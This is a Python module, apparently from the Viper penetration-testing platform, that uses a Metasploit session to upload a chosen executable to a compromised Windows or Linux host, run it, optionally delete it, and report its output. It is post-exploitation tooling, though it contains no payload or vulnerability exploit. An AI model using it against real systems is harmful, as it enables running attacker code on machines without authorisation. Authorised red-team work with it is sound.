# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "上传并执行可执行文件"
    DESC_ZH = "模块将用户指定文件上传到目标机并执行."

    NAME_EN = "Upload and execute executable files"
    DESC_EN = "The module uploads the user-specified file to the target machine and executes it."

    MODULETYPE = TAG2TYPE.Execution
    PLATFORM = ["Windows", "Linux"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", "Root"]  # 所需权限
    ATTCK = ["T1081"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1059/"]
    README = ["https://www.yuque.com/vipersec/module/gkm65g"]
    AUTHOR = ["Viper"]
    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionFileEnum(),
        OptionStr(name='ARGS',
                  tag_zh="命令行参数", desc_zh="运行可执行文件时命令行参数",
                  tag_en="Args", desc_en="Command line parameters when running executable files",
                  length=24, ),
        OptionBool(name='CLEANUP',
                   tag_zh="清理可执行文件", desc_zh="执行完成后是否删除可执行文件",
                   tag_en="Clean up executable files",
                   desc_en="Whether to delete the executable file after the execution is complete"),
        OptionInt(name='TIMEOUT',
                  tag_zh="等待时间", desc_zh="读取输出前等待时间",
                  tag_en="Waiting time", desc_en="Wait time before reading output",
                  default=10),
        OptionEnum(name='OS',
                   tag_zh="OS", desc_zh="可执行文件适配的OS(Windows/Linux/ALL),ALL或者不填写表示跳过检查",
                   tag_en="OS",
                   desc_en="Executable file adaptation OS (Windows/Linux/ALL), ALL or not filling in means skip check",
                   default='windows',
                   enum_list=[
                       {'tag_zh': 'Windows', 'tag_en': 'Windows', 'value': 'windows'},
                       {'tag_zh': 'Linux', 'tag_en': 'Linux', 'value': 'linux'},
                       {'tag_zh': 'ALL', 'tag_en': 'ALL', 'value': 'all'},
                   ]),
        OptionEnum(name='ARCH',
                   tag_zh="ARCH", desc_zh="可执行文件适配的Arch(x86,x64),ALL或者不填写表示跳过检查",
                   tag_en="Arch",
                   desc_en="Executable file adaptation Arch (x86, x64), ALL or not fill in means skip check",
                   default='x64',
                   enum_list=[
                       {'tag_zh': 'x86', 'tag_en': 'x86', 'value': 'x86'},
                       {'tag_zh': 'x64', 'tag_en': 'x64', 'value': 'x64'},
                       {'tag_zh': 'ALL', 'tag_en': 'ALL', 'value': 'all'},
                   ]),

    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "multi/manage/upload_and_exec_api"

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        os = self.param('OS')
        if os == "windows" and session.is_windows:
            pass
        elif os == "linux" and session.is_linux:
            pass
        elif os is None or os == "all":
            pass
        else:
            return False, "模块os参数与session的os不一致", "The module os parameter is inconsistent with the session os"
        arch = self.param('ARCH')

        if arch == session.arch:
            pass
        elif arch is None or arch == "all":
            pass
        else:
            return False, "模块arch参数与session的arch不一致", "The module arch parameter is inconsistent with the session arch"

        filename = self.get_fileoption_filename()
        self.set_msf_option("LPATH", filename)
        self.set_msf_option("CLEANUP", self.param("CLEANUP"))
        self.set_msf_option("TIMEOUT", self.param("TIMEOUT"))
        self.set_msf_option("ARGS", self.param("ARGS"))
        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
            return

        self.log_good("模块运行完成,可执行文件输出:", "After the module runs, the executable file outputs:")
        self.log_raw(data)
